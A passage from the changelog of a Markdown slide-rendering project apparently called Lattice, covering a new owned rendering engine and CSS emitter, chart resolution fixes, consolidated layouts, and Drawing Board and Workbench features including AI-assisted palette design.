  pre-filled from the deck's current front matter and write a managed `---` block
  at the top of the source — so the Markdown body stays content-only, the values
  persist across refreshes (they ride the deck source into IndexedDB), and an
  exported `.md` finally carries `marp: true` + its directives instead of shipping
  naked. The config chip lights when the deck carries non-theme front matter.
- **Drawing Board — theme is now explicit + synced.** The top-bar palette picker,
  the Deck setup drawer's theme select, and the editor's `theme:` front matter are
  three views of one value: picking a palette writes `theme:` into the deck (no
  more silent render-time override), editing a valid `theme:` updates the picker
  and page chrome, and switching decks adopts each deck's theme. Only a registered
  palette propagates — an unknown/typo theme is left in the source but never
  applied (the deck can't render unstyled), with a caution note in the drawer. The
  deck's theme now travels with an exported `.md`.
- **`lattice-engine` owned CSS emitter, opt-in via `?css=engine`.** The owned
  engine can now emit its own theme-packed stylesheet instead of borrowing
  marp-core's packer — the last marp dependency on the playground/Drawing Board
  path. The emitter (`lib/engine/css.js`) faithfully mirrors Marpit's pack
  pipeline (root-replace + the `:not([\20 root])` specificity guard, slide-scoping
  prepend, `::after` pagination-content masking) so the cascade is byte-equivalent
  on the load-bearing rules — closing the mobile-WebKit regressions (collapsed cqi
  spacing, dropped CSS counters) that shelved the earlier P1.1 emitter. Gated by a
  new browser-independent CSS-pack parity test vs marp-core and by full desktop
  pixel parity across the 89pp baseline gallery + the full 65-gallery component
  corpus (`tools/engine-parity.mjs --own-css`). The owned sheet is ~43% smaller
  than marp's pack (drops twemoji / `marp-h1` auto-scaling / scroll-snap baggage)
  and the owned `composeCss` is ~7× faster than marp's packer, cutting the full
  playground render path to ~2.6× faster than marp. Default stays on marp's packer
  pending a real-device check; `?css=engine` (implies `?engine=lattice`) opts in.
- **`dist/lattice.css` now bundles the KaTeX base stylesheet.** `tools/build-css.js`
  vendors KaTeX's layout sheet from the installed `katex` package (font URLs
  rewritten to the pinned jsDelivr CDN, as marp-core does) into the engine bundle,
  so math glyphs are styled by `dist/lattice.css` alone — no marp-core injection
  required. This is what lets the owned CSS emitter reach math parity; it also
  means any drop-in `dist/lattice.css` consumer now renders `$…$` math correctly.

### Fixed

- **`word-cloud` now scales as one unit at any resolution.** The cloud was
  emitted as absolutely-positioned `<span>`s inside a fixed-px (1100×320)
  canvas, so at a larger render (e.g. `size: 4K`) the words stayed pinned at
  their HD pixel sizes while the slide grew around them — the last pure-HTML
  fixed-px chart (#180). The build-time spiral packer is unchanged (its
  coordinates were always an abstract 1100×320 space); only the emission
  changed — the cloud is now a `viewBox="0 0 1100 320"` SVG whose `<text>`
  nodes carry the packer's coordinates as viewBox units, so the whole cloud
  scales crisp with the slide (~3× at 4K), exactly like the pie/radar/quadrant
  SVG members. The canvas box moved from fixed px to cqi (85.9375 × 25cqi); the
  key rail + gradient spine stay HTML (already resolution-stable). All five
  variants verified light + dark at HD and 4K; `.wc-svg` joins the
  `check-svg-scaling` 4K fidelity gate. Fourth slice of the chart
  responsiveness epic (#180).
- **`state-chart` now scales as one unit at any resolution.** The state-machine
  diagram laid its nodes out entirely in fixed px (column gutters, gaps, node
  padding, max-widths, the SVG edge/label/marker strokes), so on a larger render
  the cqi-sized node text grew while the diagram chrome stayed pinned — the same
  fixed-px hazard as the chart caps (#180). Node layout is now cqi, and the
  browser-measured edge overlay (which draws edges/markers/labels in JS px from
  the measured node boxes) rescales every geometry constant by the live cqi
  factor — `S = (section px-per-cqi) / 12.8`, =1 at HD, ~3 at 4K — so edges,
  arrowheads, gap floors, and label metrics track the nodes instead of pinning
  small. All variants (default / curved / lr / inline, light + dark) verified at
  HD and 4K through all three renderers. Page counts unchanged; the px→cqi
  reflow shifts HD geometry sub-pixel, so the committed galleries were
  regenerated (no perceptible change). Third slice of the chart responsiveness
  epic (#180).
- **Chart-family captions no longer leak to the slide edge when a `_footer`
  is set.** A trailing caption paragraph on any chart-frame layout (piechart,
  gantt, radar, timeline-list, …) was only lifted into the centred
  `.chart-caption` when the slide had no footer — the caption matcher anchored
  to end-of-string, and a `_footer` directive makes Marpit append `<footer>`
  after the paragraph, so the caption fell through as a raw full-width,
  body-size `<p>` flush against the slide's left edge. `wrapChartFrame` now
  peels a trailing `<footer>` off before matching the caption and re-appends
  it. Single-source fix — all three render paths and all 13 chart-frame
  layouts. Surfaced on the `gallery-jargon` donut slide; the piechart `donut`
  sample now carries a caption so the case is covered. See
  `engineering/gotchas.md`.
- **The `.below-note` hairline now renders under marp-cli and the marp-vscode
  preview, not just the emulator.** The trailing-`<p>` hairline wrap was bespoke
  to the emulator's `parseSlide`, so the marp-cli render path and the runtime
  (marp-vscode preview) silently omitted it — the emulator had diverged from
  marp on every slide with an editorial below-note (the cross-renderer gate only
  checks page counts). The wrap is now a shared kernel (`lib/core/below-note.js`)
  wired into the transformer registry (`applyToHtml` / `applyToDom`), so all
  three render paths agree. The emulator's default output is byte-identical (it
  calls the same kernel as its last `parseSlide` step); engine↔marp parity holds
  across the full 65-deck gallery sweep. (Mirrors the chart-caption footer-peel
  above — same trailing-`<footer>` handling, applied to the hairline note.)
- **`split-panel` `metric` documented sample now uses `114<em>%</em>`, not
  `114*%*`.** The component's shipped sample + variant caption (in the manifest,
  the generated `split-panel.docs.md`, and `dist/docs/components.{md,json}`) and
  the `split-panel metric` footgun-lint fix-it hint taught `114*%*` to shrink the
  unit — but `*%*` is not CommonMark emphasis next to a digit, so marp-cli and the
  engine emit literal asterisks (only the emulator's lenient parser styled it).
  All those surfaces now use an explicit `<em>`.
- **Inline-code chips no longer flatten code blocks or run eyebrows off the
  slide.** A `white-space:nowrap` on `section code` (added to keep hyphenated
  identifier chips like `--bg-alt` from wrapping at the hyphen) also matched
  `<code>` inside `<pre>` — collapsing every fenced code block onto one
  clipped line — and long backtick eyebrows/labels, which then overflowed the
  slide and tripped the overflow ring. Reverted the blanket nowrap: inline
  code wraps normally again and block code keeps its newlines (the `pre code`
  reset now pins `white-space:pre`). Affected every deck with a `code` /
  `compare-code` slide or a long eyebrow. See `engineering/gotchas.md`.
- **`radar` and `quadrant` now scale with the slide at any resolution.** Their
  SVGs were ceilinged with a fixed `max-height: 360px`, so on a larger render
  (e.g. `size: 4K`) the chart stayed pinned small while the cqi-driven type and
  slide grew around it. The cap is now `50cqh` (50% of the slide height) — the
  same 360px at HD but resolution-independent, so the chart fills its slot and
  scales ~3× to 4K. A new render-based gate (`tools/check-svg-scaling.js`,
  wired into the integration tier) renders a fixture at HD and 4K and asserts
  each chart SVG scales, catching any future fixed-px cap. First step of the
  chart responsiveness epic (#180).
- **Chart borders, rules, and accent stripes now hold their weight at any
  resolution.** Every chart hairline was a fixed `1px` (and the spine `2px`,
  fill/phase accents `4px`/`6px`) — pinned px that visually thin toward nothing
  as the native render resolution climbs (a `1px` rule at 4K is a third the
  relative weight it has at HD). They now route through resolution-stable line
  tokens — `--chart-hairline`, `--chart-spine-w`, `--chart-fill-accent`,
  `--chart-accent-lg` — each a `clamp(<legacy px>, <cqi>, <cap>)` that floors at
  the legacy px (so HD output is byte-identical, no gallery churn) and grows to a
  tight ~2× cap above HD (a hairline never thickens into a bar at 4K/10K). Applies
  family-wide across gantt, kanban, progress, roadmap, map, piechart, quadrant,
  timeline-list, and the shared chart frame. Second step of #180; journey's
  decorative band/curve strokes (a proportional, not hairline, treatment) and the
  state-chart / word-cloud rebuilds remain tracked there.
- **`lattice-engine` pagination now counts like marp-core.** A `paginate: false`
  slide is still counted toward the page numbering, so the next slide reads its
  true absolute position and the total reflects the whole deck (the engine had
  renumbered after a hidden slide and undercounted the total — a deck with a
  `_paginate: false` cover read "1" where marp reads "2"). Caught by the parity
  sweep on the diagram gallery.
- **`lattice-engine` now matches marp-core on fenced code, soft breaks, and
  inline-math delimiters.** A full-corpus visual-parity sweep (the new
  `tools/engine-parity.mjs`, which rasterises every gallery slide through both
  engines and pixel-diffs them) caught three real divergences: (1) fenced code
  rendered as flat monochrome (no `hljs-*` token spans); (2) soft line breaks
  dropped their `<br>`, collapsing multi-line blockquotes (e.g. a math `stats`
  slide's CI/p-value lines) onto one line; (3) inline-math `$…$` had no delimiter
  guards, so currency prose ("$400M … up 28% … $18M") was swallowed as one math
  span and garbled. The engine now wires highlight.js into markdown-it
  (byte-identical spans to marp, Mermaid grammar included), sets `breaks: true`,
  and guards the math delimiters (opening `$` not followed by whitespace, closing
  `$` not preceded by whitespace nor followed by a digit). New direct dependency:
  `highlight.js` (pinned to `^11.11.1` to match the copy marp-core bundles).
- **Drawing Board / playground: decks with YAML front matter no longer render a
  spurious blank leading slide on the marp engine.** `lib/playground/index.js`
  forced the selected palette by prepending a `<!-- theme: … -->` comment, which
  pushed a `---` front-matter fence off line 0 — Marpit then stopped parsing it as
  front matter, emitting an empty leading slide and painting the directives as
  body text. The theme directive is now injected *inside* the front matter when
  present (a leading comment only when there is none). Caught by the parity sweep;
  Drawing Board (docs-site) only.

### Added

- **`@slidewright/lattice/engine`** — an experimental, owned markdown→slide
  engine (`lib/engine/`), the P1 core of the Marp-replacement effort
  (`engineering/decisions/2026-06-10-marp-replacement-proposal.md`). Built on
  `markdown-it` 14, it reproduces Marpit's slide/directive token contract so the
  existing Lattice plugins and the transformer registry run on it unchanged, and
  matches marp-core's per-section HTML structure across the full gallery corpus
  (55/55 decks; twemoji is the one intentional divergence — emoji render via
  font, not `<img class="emoji">`). It does **not** yet replace any shipping
  render path (marp-cli, the playground, and the emulator are untouched). New
  direct dependency: `markdown-it`.
- **`lattice-engine` now emits a complete stylesheet (P1.1).** `render().css` is
  no longer a stub: it composes an engine-owned scaffold with the selected
  theme, resolving `@import 'lattice'` against the registered base palette and
  honouring the `size:` directive's `@size` geometry (`lib/engine/css.js`). The
  scaffold is modeled on Marpit's — load-bearing rules only
  (slide box + `container-type`, pagination pseudo-element, `@page`/print
  fidelity), emitted *correctly* (no `padding:inherit` on the pagination
  number), so themes compose without the `!important` override layer marp-core's
  defaults force. It also reproduces Marpit's one load-bearing CSS-pack step —
  relocating each theme `:root { … }` token block onto the slide `:where(section)`
  so cqi-valued tokens (`--sp-*`, …) resolve against the slide's
  `container-type:size` container rather than the viewport; left on `:root` they
  render fine on desktop Chromium but collapse on mobile WebKit (gaps → 0,
  counters vanish). The marp-only baggage (twemoji img sizing, `marp-h1`
  auto-scaling, full `div.marpit > section` selector prefixing, the `video`
  webkit hack, `scroll-snap-align`) is deliberately absent. A deck now renders to
  a styled PDF through the engine alone, with no marp-core in the loop.
- **The docs playground can render through `lattice-engine` (P3, opt-in).** The
  playground bundle now carries both engines; `window.LatticePlayground` gains
  `setEngine('marp'|'lattice')` and an `engine` getter, and a `?engine=lattice`
  query param selects the owned engine on load. The default stays marp-core, so
  visitors and every existing gate are unchanged — but the Drawing Board now
  doubles as a live A/B harness for the Marp-replacement engine. Themes register
  on both engines, so switching needs no re-fetch.
- **Drawing Board: export provenance + a visible build tag.** Because the two
  engines render pixel-identically (the owned engine delegates CSS packing to
  marp's, so a marp-core and a lattice-engine PDF differ only by the writer's
  random PDF `/ID`), exports now record *which* engine produced them. PDF
  (jsPDF) and PPTX exports stamp the document properties — `Creator`/`Subject`
  carry the engine + Lattice version + build, and a structured `Keywords` string
  (`engine=…; lattice=…; build=…; theme=…; mode=…; slides=…; src=…`) packs the
  full context (the source field is a short FNV-1a hash of the deck markdown).
  The vector Print path encodes the engine into the PDF title (the only field
  Chromium lets us set). A matching `build <hash>` + live engine badge rides the
  Architect header row (right-aligned, stacked) on **PR-preview deploys only**,
  so a tester on a device can read off exactly which deploy + engine they loaded
  without it crowding the topbar. Drawing Board (docs-site) only — no engine or
  package change.
- **The Workbench — Theme Studio (Faculty 1).** A new docs-site page
  (`/workbench`) where you craft a palette from a handful of essential colours
  and watch it derived, contrast-audited, and rendered live on a specimen deck,
  then copy or download a droppable `themes/<name>.css`. Backed by a new pure,
  dependency-free engine module **`lib/theme/`** (`color`, `derive`, `contrast`,
  `serialize`, `starters`, `ai`): an essential set → the full ~80-token Lattice
  contract, repaired contrast-aware to clear WCAG AA in both canvas modes. The
  derivation + contrast maths are the SAME the Node tooling and the palette
  contrast gate use (the gate now shares `lib/theme/color.js`).
  - **AI tier (Phase 2):** one conversational box — *describe* a palette to
    originate ("warm editorial, terracotta") or *ask for a change* ("cooler",
    "navy accent") to adjust; the model infers which from your words (the
    current palette is sent as context), and recent prompts return as
    re-runnable chips. Uses the same on-device / OpenRouter model ladder the
    Drawing Board uses (connection shared through `localStorage`). The model
    only proposes an essential set; the deterministic derivation + contrast
    gate dispose. Degrades cleanly with a "connect a model" prompt when none
    is connected.
  - **Responsive:** a Design · Preview · Contrast tab bar on small screens;
    single-column reflow.

  Docs-site feature + additive engine module — no change to existing layouts,
  themes, or the render path.
- **The Workbench — Layout Studio (Faculty 2, CSS-only).** A second faculty on
  `/workbench` (a faculty switch in the header — Theme Studio ⇄ Layout Studio):
  author a CSS-only local *component* — palette-blind CSS scoped to its own
  `_class`, plus a manifest and a skeleton — and watch it rendered live and held
  to the engine's own invariants by a deterministic gate (tokens-only, `.<name>`
  selector scoping, manifest/skeleton coherence). Backed by a new pure engine
  module **`lib/layout/`** (`gate`, `scaffold`, `starters`): the SAME gates the
  unit tests run, bundled to the browser. Copy the CSS/manifest or download a
  graduation scaffold (`<name>.{manifest.json,styles.css,skeleton.md}` in the
  engine's own `lib/components/<bucket>/<name>/` folder shape). Browser-scoped
  for now. Docs-site feature + additive engine module — no change to existing
  layouts, themes, or the render path.
- **The Workbench — a saved-asset library (IndexedDB).** Both studios gain a
  **Library**: “Save current” persists the work as an asset record
  (`kind:'theme'` / `kind:'component'`), and saved assets load back for editing
  or delete — your crafted themes and components survive a reload. A first slice
  of the asset model (`2026-06-09-drawing-board-asset-import.md`): a dedicated
  `lattice-workbench` IndexedDB store, kept separate from the Drawing Board's DB
  so a first asset slice can't perturb its schema. The record SHAPES are the
  pure, unit-tested repo core (`themeAsset` in `lib/theme/serialize.js`,
  `componentAsset` in `lib/layout/scaffold.js`). Cross-surface reuse (the
  Drawing Board consuming library themes; deck-export materialization across all
  three render paths) is the next slice — the export bridge. Docs-site only.

### Changed

- **Color emoji now load as a webfont.** `lattice.css` adds `Noto Color Emoji`
  to its Google Fonts `@import` so raw unicode emoji can render in color on the
  owned render paths (`lattice-engine`, `lattice-emulator`), which emit emoji as
  plain text rather than twemoji `<img>`. Because Chromium honors an *installed*
  emoji font far more reliably than an `@font-face` one, CI and the cloud session
  hook now also install `fonts-noto-color-emoji`; the SlideWright desktop app
  must ensure a color emoji font is present in its WebView. The marp-cli /
  marp-vscode paths still use twemoji and keep the `:not(.emoji)` carve-outs. See
  `engineering/gotchas.md` "Color emoji needs an installed font on the owned
  render paths".

### Removed

- **Breaking: the Puter cloud tier is removed from the Drawing Board.** OpenRouter
  is now the only Converse cloud (the user's own account, any of 500+ models). The
  Puter backend, its SDK `<script>`, the "Connect Puter" button, and the dual-cloud
  "which cloud is active" chooser are all gone — along with the adapter surface
  (`connectPuter`, `setCloud`, `availability.puterReady`/`.cloud`). Anyone who was
  on Puter falls back to on-device AI or the deterministic floor until they connect
  OpenRouter. Drawing Board (docs-site) only — no engine change.
- **Breaking: `split-brief`, `split-metric`, `split-statement`, `split-steps`,
  and `split-list` are removed** — consolidated into a single **`split-panel`**
  component (the featured-left-panel + supporting-right-zone family; they
  differed only in finish). Migrate: `split-brief` → `split-panel` (default),
  `split-metric` → `split-panel metric`, `split-statement` → `split-panel pullquote`,
  `split-steps` → `split-panel steps`, `split-list` → `split-panel watermark`.
  `split-compare` is unchanged (its right zone is a distinct 2-option grid +
  verdict). The family's `form` is corrected from `split` to `panel`. The dead
  `splitPanelCounter` marp plugin (numbered the removed `split-list`) is also
  removed. See `engineering/decisions/2026-06-07-split-family-analysis.md`.
- **Breaking: the `before-after` layout is removed.** It was `compare-prose`
  with an arrow connector and an accent ring on the second ("after") card — the
  same two-card data shape — so it is now the `transition` variant of
  `compare-prose`: migrate `<!-- _class: before-after -->` to
  `<!-- _class: compare-prose transition -->` (write Before / After as the two
  labels; `banner-tag` still composes). The shared corner-tag / banner-tag CSS
  that had been hosted in `before-after.styles.css` moved to
  `compare-prose.styles.css`; `decision` (which also uses it) is unaffected.
  Part of the layout-redundancy consolidation.
- **Breaking: the `timeline` layout is removed.** It was `list-steps` with
  lighter, shorter rows — the same ordered-steps data shape, dots-on-a-spine
  instead of step cards — so it is now the `timeline` variant of `list-steps`:
  migrate `<!-- _class: timeline -->` to `<!-- _class: list-steps timeline -->`
  (`ol` → numbered discs, `ul` → plain dots, same as before). The Mermaid
  `timeline` *diagram* type and the `regulatory-update timeline` variant are
  unaffected. Part of the layout-redundancy consolidation (see
  `engineering/decisions/2026-06-07-layout-redundancy-analysis.md`).
- **Breaking: the `cards-side` layout is removed.** It was `compare-prose`
  minus the comparison chrome — the same two-co-equal-card data shape (title +
  nested body) — so it is dropped with no alias. Migrate
  `<!-- _class: cards-side -->` to `<!-- _class: compare-prose -->` (identical
  authoring shape: a top-level bullet is the card title, a nested bullet carries
  the body). Part of the layout-redundancy consolidation (see
  `engineering/decisions/2026-06-07-layout-redundancy-analysis.md`).
- **Breaking: the `tldr` and `principles` layouts are removed.** Both were flat
  one-line-item stacks that differed from `list` only in finish, so they are now
  `list` variants: migrate `<!-- _class: tldr -->` to `<!-- _class: list takeaway -->`
  (and `tldr numbered` to `list takeaway numbered`), and `<!-- _class: principles -->`
  to `<!-- _class: list principles -->` (with `lettered` / `roman` / `bullet` still
  composing: `list principles lettered`). The authoring shape is identical (a flat
  `ul`/`ol` of single-line items). Part of the layout-redundancy consolidation
  (see `engineering/decisions/2026-06-07-layout-redundancy-analysis.md`).
- **Breaking: the `subtopic` layout is removed.** Its bright-canvas, centered
  sub-section break is now the `light` variant of `divider` — migrate
  `<!-- _class: subtopic -->` to `<!-- _class: divider light -->` (and
  `subtopic numbered` to `divider light numbered`). The slots are identical
  (optional inline-code eyebrow + `h2` heading); only the dark-vs-light canvas
  differed, which is what the variant now carries. Part of the layout-redundancy
  consolidation (see `engineering/decisions/2026-06-07-layout-redundancy-analysis.md`).
- **Breaking: the `cards-wide` layout is removed.** `cards-stack` now covers
  its territory — three or four full-width rows with substantial per-card
  body — so the two no longer overlap. Migrate any `<!-- _class: cards-wide -->`
  slide to `<!-- _class: cards-stack -->`; the authoring shape is identical
  (a top-level bullet is the card title, a nested bullet carries the body),
  and a fourth row fits with the `compact` modifier.

### Changed

- **Drawing Board: the Architect's name no longer appears twice, and the deck
  gateway grows to fill the panel head.** The redundant "The Architect" panel
  title is gone — the name lives once, in the avatar mark below — so the head
  leads with the deck you're on. The deck-name gateway now flex-grows to fill
  the freed width (left-aligned label, caret pinned to the right edge like a
  real dropdown) instead of truncating at an 11rem cap. The model settings chip
  to its right reserves a constant width, so when its tier word settles async
  (connecting → Cloud / Local / …) the bar no longer reflows sideways. Most
  visible on mobile, where the deck name had the least room. Drawing Board
  (docs-site) only.
- **Drawing Board: the session spend figure now shows tokens too** — e.g. "This
  session: $0.081 (25K tokens)". Tokens accumulate locally from each reply's `usage`
  (recorded independently of cost, so a free model's tokens still count). The
  OpenRouter account line stays dollars-only — `/auth/key` returns no per-key token
  total. Drawing Board (docs-site) only.
- **Drawing Board: the Settings drawer is organized into tabs** — `Workspace ·
  Cloud AI · On-device` — instead of one long scroll (the Cloud AI section had
  grown dense). Each tab is a short pane; the model chip deep-links to the **Cloud
  AI** tab. Arrow-key tab nav + `tablist`/`tab`/`tabpanel` roles. Purely
  organizational — no control changed. Docs-site only.
- **State markers: `[ ]` reconciled to a neutral "todo / pending" across every
  layout, with a new colour-blind-safe `--mark-todo` open ring.** `[ ]` was
  decoded uniformly as `fail` + `✕` (red) everywhere, but it means a *neutral*
  "not yet" in most layouts — checklist `todo`, obligation-matrix `exempt`,
  roadmap `planned` — and only "not met" in verdict-grid. The decoder is now
  layout-aware: those neutral cases emit `state todo state-todo` and render as
  an **open ring on a neutral disc** (the shared `--mark-todo` mask, + a
  `--mark-todo-bold` for `checks-bold`); verdict-grid keeps `fail` + the red
  `✕`. **Breaking (visual):** existing `checklist` / `obligation-matrix` decks
  with `[ ]` items now render those rows **neutral instead of red** — the
  correct reading of "to-do", not "failed". The stable marks (✓ done · – partial
  · ╱ out-of-scope) are unchanged. Marks are vector CSS masks, so they stay
  pixel-crisp across PDF / HTML / raster exports. **`roadmap` now draws its
  state markers from the same shared `--state-mark` mask recipe** (its discs +
  masked symbols, default / horizons / status), so one theme-token set drives
  every chart *and* checkbox in lockstep — no more bespoke per-component glyphs.
- **`roadmap` folded into the chart family.** It is now a chart-frame member
  dispatched by the chart engine
  (`lib/components/chart/_chart-family/chart-family.js`) instead of a standalone
  transformer, and moves from the `progression` disk bucket to `chart` (its
  `function` stays `progression`). The workstream × phase grid now renders in
  the shared `.chart-frame` skeleton — eyebrow → centered `h2` → body →
  caption — with the table (or transposed `horizons` cards) wrapped in a
  `.roadmap-figure`; the grid opts down to the compact content step so a full
  set of rows clears the centered header. Authoring (the Markdown table, the
  `[x]/[-]/[ ]/[/]` markers, every variant) is unchanged.
- **`roadmap` state markers are now colour-blind-safe.** The retired
  fill-level glyphs — the half-filled disc (`in flight`) and the hollow
  outline ring (`planned`) — are replaced by shape-distinct white marks on the
  state-coloured disc: **check / dash / cross / slash** for
  shipped / in-flight / planned / out-of-scope, across the default, `horizons`,
  and `status` treatments. Each state now reads in greyscale and for
  colour-vision-deficient viewers (colour is the redundant channel, not the
  only one), matching the mark vocabulary `checklist` / `verdict-grid` /
  `obligation-matrix` already use.
- **`journey` and `word-cloud` folded into the chart family.** Both are now
  chart-frame members dispatched by the chart engine
  (`lib/components/chart/_chart-family/chart-family.js`) like every other
  chart, instead of standalone transformers. They render in the shared
  `.chart-frame` skeleton — eyebrow → centered `h2` → body → caption — so a
  `journey` or `word-cloud` slide now picks up the same header rule, caption
  treatment, and opt-in `.canvas` surface panel as `progress` / `radar` /
  `gantt`. `journey` also moves from the `progression` disk bucket to the
  `chart` bucket (its `function` stays `progression`); the authoring class
  names (`<!-- _class: journey -->`, `<!-- _class: word-cloud -->`) and every
  variant are unchanged. `word-cloud`'s bespoke frame-mirroring CSS (its own
  `> h2` rule and `.canvas` panel `::before`) is retired in favour of the real
  skeleton. Decks render identically across all three paths; only the visual
  framing of these two layouts changes.
- **The Drawing Board chat now styles Architect replies as they stream**, not
  only once the stream completes. Each token re-renders the accumulated reply
  through the existing zero-dependency `renderMarkdown` (no `unified`/`remark`
  added), coalesced to one paint per animation frame. A new `renderMarkdownStream`
  wrapper holds back the trailing *incomplete* construct (an open ```` ``` ````
  fence, a half-typed `` `code` `` span, a `[label](partial` link) so partial
  syntax never flashes a block that then unwraps; inline emphasis still degrades
  to literal until its closer arrives. The final render is unchanged and exact.
- **Disconnect OpenRouter now has a guardrail.** Forgetting the key (and re-doing
  OAuth) was a one-click action; it now mirrors deck deletion via the `deleteStyle`
  preference — an inline "Disconnect?" confirm bar, or an optimistic disconnect with
  a reversible "Undo" toast (the key is snapshotted and restored on Undo, no
  re-auth). Drawing Board (docs-site) only.
- **Inline code chips are now surface-aware.** The `section code` chip was a
  single context-blind rule (`--bg-alt` fill + `--accent` ink) tuned only for
  the default canvas, so it read as a glaring near-white box on dark bookends
  and the split-panel rail, vanished into `--bg-alt` cards, and went muddy on
  the key-insight panel. The chip now derives its fill and border from its own
  ink via `color-mix(currentColor)`, so it is always a subtle delta from
  whatever surface it sits on, and a new `--code-inline-fg` / `--code-inline-bg`
  / `--code-inline-border` token seam (distinct from the block-code
  `--code-bg` / `--code-text`) lets a surface or theme retune it by rebinding
  one value. The non-flipping dark islands (`title` / `divider` / `closing`
  bookends, split-panel dark rail) rebind the ink to the on-dark tier.
  **Every theme now curates `--code-inline-fg`** — an explicit, AA-audited chip
  ink per palette (light + dark), deepened toward the brand hue where the raw
  accent fell below 4.5:1 on the card wash (brina, cuoio, indaco, laguna,
  magnolia, mustard) or lifted on the dark card (burgundy); the high-contrast
  achromatic palettes keep the accent. See
  `engineering/decisions/2026-06-08-inline-code-contrast.md`.

- **The `list` component is now an equal-fill ledger.** All three registers
  (default pills, `takeaway`, `principles`) now fill the working area — each row
  takes an equal share of the slide height with its content vertically centred —
  so a slide reads edge-to-edge whether it carries three items or the layout's
  max, instead of a small block floating in the centre. Type steps up to the
  message scale (21pt; `principles` to the 30pt display register) and numbered
  counters share a centreline with their text. Existing `list` decks re-flow
  larger and fuller; no source changes needed.
- **Breaking: the `closing` and `divider` heading slot is now `h2`, not
  `h1`.** A deck has exactly one document `h1` — the `title` slide — so a
  `closing` or `divider` slide emitting a second `#` heading made every deck
  fail markdownlint's single-`h1` rule (MD025) and read as structurally
  invalid Markdown. Both layouts now style `h2` (rendered at the same
  `--fs-h1` size, so the slides look identical), and the dead `h1` rules are
  dropped. Migrate `closing`/`divider` slides from `# Heading` to
  `## Heading`; an unconverted `#` heading now renders unstyled. `title`
  keeps `h1` — it is the deck's one legitimate document heading. All shipped
  galleries, examples, and the baseline deck are converted.

- **`kpi` and `stats` no longer require `**bold**` for their numbers.** Both
  now auto-lift the parent list item's lead (the figure) into the display-type
  `<strong>` via `slotLabelLift`, so authors write `1. $2.4B` / `1. 73%`
  instead of `1. **$2.4B**` / `1. **73%**`; typing the bold is an idempotent
  no-op. **Breaking (stats only):** `stats` moves from the inline
  `1. **73%** faster close` shape to the nested shape every other slot layout
  uses — the caption is now a nested bullet:

  ```
  1. 73%
     - faster close
  ```

  The old emulator-only parse-and-rebuild into `.stats-row` is removed (marp
  and runtime already styled the raw list, so the three render paths now
  agree), and the `:has(.stats-row)` CSS fallback is gone. Migrate any
  `_class: stats` slide to the nested shape. `kpi` is unaffected — its decks
  already used the nested shape, so the de-bold is non-breaking. A new
  `number-slot-bodyless-item` lint warning flags a kpi/stats item authored
  without its nested label (the number won't render in display type). See
  `engineering/decisions/2026-06-07-slot-header-auto-lift.md`.
- **`timeline`, `list-criteria`, and `actors` no longer require `**bold**`
  markdown for their slot headers.** These layouts now auto-lift each
  top-level list item's lead text into the heading via `slotLabelLift` (the
  same mechanism `before-after`, `decision`, `statute-stack`, etc. already
  used), so authors write `1. Pilot` / `- Owns the model \`Owner\`` instead
  of `1. **Pilot**` / `- **Owns the model** \`Owner\``. Existing decks that
  still use the bold markdown render identically — the lift is idempotent,
  so `**…**` is now optional, never wrong. For `actors`, a trailing inline
  `code` actor-name pill is kept a sibling of the lifted heading so its
  right-aligned pill placement is preserved. The shipped samples, galleries,
  and per-component docs drop the bold; stale `compare-prose` / `split-list`
  doc text that told authors to write `**Label.**` is corrected to describe
  the automatic behavior.
- **The `split-brief`, `split-metric`, and `split-statement` right-panel
  titles no longer require `**bold**` either.** Same auto-lift treatment —
  their samples, skeletons, and docs drop the bold and use the nested
  `- Title` / `  - body` shape. A new author-lint rule (`split-bodyless-item`,
  also enforced on manifests) catches the one shape the lift *can't* rescue:
  a right-panel item with no nested body (inline `- Title. body` or a bare
  `- Title`), which renders as flat unhierarchied text because the lift needs
  a nested body to know where the title ends. `npm run lint:deck` now reports
  it as an error with the nested-shape fix.
- **Docs site — component search now persists, and the playground gained the
  reference's search + Group-by.** The component reference remembers your
  search term across a click-through to a component page (and the mobile
  drawer close), restoring and re-running it instead of discarding it
  (per-tab, via `sessionStorage`). The playground's component picker is now a
  searchable, groupable popover (fuzzy search + Family/Function/Substance/A–Z
  Group-by, reusing the reference's engine) in place of the long native
  `<select>`. The toolbar is slimmer: the `Insert example` / `Insert skeleton`
  buttons move into a ⚙ menu (selecting a component inserts its example; the
  menu holds *Reset to example* and *Insert blank skeleton*), and the Component
  trigger + Variant select now have a fixed footprint so a long label truncates
  instead of reflowing the bar to a new row. The toolbar is fully responsive:
  on a phone it splits into two rows — Component + Variant (labels stacked on
  top) above, Edit/Preview grouped at the left with the ⚙ at the right below —
  and the page is an app-shell flex column so the editor/preview split fills
  whatever height the bar takes. Both popovers (picker and ⚙) clamp themselves
  into the viewport so they're never clipped at a screen edge.
- **The browsable component reference is now built into the docs site as
  per-component pages.** Each component gets its own focused page
  (`/components/<bucket>/<name>/`) with a live preview that flips to an
  in-browser editor (CodeMirror — the whole sample, no scroll), a left-nav
  component tree with filter, and the full anatomy / slots / variants /
  when-why documentation — all themable live from the topbar palette and
  light/dark, like the playground. A new `/components/` index lands the
  catalog (searchable cards by name, description, or tag). The old
  single-file `dist/docs/components.html` portal is no longer generated;
  the shipped single-file references are now `dist/docs/components.md`
  (human) and `dist/docs/components.json` (agent catalog), and the
  `Components` link everywhere points at the new pages.

- **`split-compare`'s verdict is now a recommended card with a corner tag.**
  The recommendation bar was restyled from a flat full-accent band into a soft
  accent-container card (`--accent-soft` fill, accent border) with a flush
  top-left "RECOMMENDATION" corner tag (accent fill + `--on-accent` ink),
  matching the cards-grid ordered-list corner-tag pattern. The tag is the
  eye-catcher; the recommendation reads as normal body. The right column's
  bottom padding now clears the footer/pagination chrome so the card never
  bleeds into it.
- **`diagram` dark mode now renders natively per slide (dual-resolve), and the
  dark-flip CSS override layer is collapsed.** The emulator resolves the Mermaid
  `themeVariables` to the palette's *dark* branch and bakes the diagram with that
  set when its slide is dark (nearest `_class: … dark`, or a deck-wide dark
  signal) — instead of baking one light SVG and patching it with CSS. This mirrors
  the runtime, which already resolved tokens per-section via `getComputedStyle`;
  the emulator now matches it (parsing the palette CSS at build time, since mmdc
  has no live DOM). Mermaid bakes themeVariables to literal hex, so a light bake
  can't flip on a `section.dark` slide; baking the correct scheme per slide closes
  that gap natively — including Mermaid's own colour-math (edge labels, edge lines,
  arrowheads, sequence text/lines, gantt section titles, ER entity headers). With
  dark now baked correctly, the redundant dark-flip overrides in `mermaid.css` are
  removed (proven 0-pixel-identical under dual-render). ER dark improves: entity
  headers now show their brand category colour instead of a flat grey level.
